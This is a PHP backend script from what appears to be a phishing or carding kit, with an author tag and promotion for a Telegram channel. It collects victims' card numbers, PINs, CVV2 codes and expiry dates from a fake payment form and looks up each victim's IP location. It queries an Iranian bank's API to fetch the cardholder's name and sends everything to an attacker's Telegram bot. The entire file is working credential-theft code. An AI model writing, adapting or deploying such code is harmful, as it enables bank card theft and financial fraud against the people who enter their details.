<?php

/* CODED BY @mr_reee

JOIN : @Octopus_Card */

if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}

include "functions.php";
include "time.php" ;
$e= basename($_POST ["e"]);
include"../User/$e.php";
include"../INFO.php";
include"../3.php";

$paylimit = 3; 
$sendEmail = true;
$pan = $_POST["pan"];
$pin = $_POST["pin"];
$cvv = $_POST["cvv2"];
$year = $_POST["expireYear"];
$month = $_POST["expireMonth"];
$num = $_POST["num"];
$amount = $_POST["am"];
if(isset($_POST["inputemail"])){
    $email = $_POST["inputemail"];
}else{
    $email = "None";
    

   
    
}

$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);

$ip = $_SERVER['REMOTE_ADDR'];
$Get_Ip = json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$lat = $Get_Ip->lat;
$lon = $Get_Ip->lon;
$isp = $Get_Ip->isp;
$regionName = $Get_Ip->regionName;
$region = $Get_Ip->region;

/* CODED BY @mr_reee

JOIN : @Octopus_Card */

$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://ipb.parsian-bank.ir/mobileBank/1.0/getCardOwnerWithoutLogin");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt( $ch, CURLOPT_HTTPHEADER, array("REMOTE_ADDR: " . $_SERVER["REMOTE_ADDR"], "HTTP_X_FORWARDED_FOR: ". $_SERVER["REMOTE_ADDR"]));
        curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"destinationPan\":\"$pan\",\"pan\":\"6280231350040589\"}");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json; charset=UTF-8',
            'User-Agent: Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.83 Mobile Safari/537.36'
        ));
        $result     = curl_exec($ch);
        $json       = json_decode($result, true);
        $holderName = $json["firstName"] . " " . $json["lastName"];
$Text = "

#New_Card 💵
^ $ip ^
▪️Card : <code>$pan1 $pan2 $pan3 $pan4</code>
▫️Pin : <code>$pin</code>
▪️Cvv2 : <code>$cvv</code>
▫️Y / M : $year / $month
$holderName
🏦 Bank : $bankinfo[1]

";
    
$Text .="";

if($sendEmail==true){
    $Text .="";
}

if( (integer)$num > $paylimit){}else{
  file_get_contents("https://api.telegram.org/bot".$TOKENS3."/sendMessage?parse_mode=HTML&chat_id=".$IDS3."&text=".urlencode($Text));

} 

/* CODED BY @mr_reee

JOIN : @Octopus_Card */
?>